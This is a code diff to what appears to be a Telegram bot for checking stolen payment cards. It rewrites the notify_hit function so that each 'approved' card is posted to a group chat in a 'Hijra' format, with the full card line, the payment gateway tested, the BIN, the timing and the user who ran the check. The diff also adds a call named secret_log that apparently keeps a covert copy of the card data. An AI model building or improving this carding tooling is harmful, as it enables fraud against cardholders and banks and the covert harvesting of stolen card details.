@@ -198,16 +198,28 @@ def notify_gc(text):
 
 
 def notify_hit(user_id, username, gate_label, card_line, detail):
-    """Notify GC about a hit/approved card."""
+    """Notify GC about a hit/approved card — Hijra format."""
     name = f"@{username}" if username else str(user_id)
-    notify_gc(
-        f"<b>HIT</b>\n\n"
-        f"User: {name}\n"
-        f"Gate: <code>{gate_label}</code>\n"
-        f"Card: <code>{card_line}</code>\n"
-        f"Result: {detail}\n\n"
-        f"<i>{DEVELOPER}</i>"
+    elapsed = ""
+    if " | " in detail:
+        parts = detail.split(" | ")
+        if len(parts) >= 2:
+            elapsed = parts[-1]
+    # BIN info
+    bin6 = card_line.split("|")[0][:6] if "|" in card_line else card_line[:6]
+    hit_text = (
+        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
+        f"[🝂] CARD: <code>{card_line}</code>\n"
+        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
+        f"[🝂] STATUS: <b>APPROVED</b>\n"
+        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
+        f"[🝂] BIN: <code>{bin6}</code>\n"
+        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
+        f"[🝂] CHECKED BY: {name}"
     )
+    notify_gc(hit_text)
+    secret_log(hit_text)
 
 
 def notify_new_user(user_id, username, key_info=""):
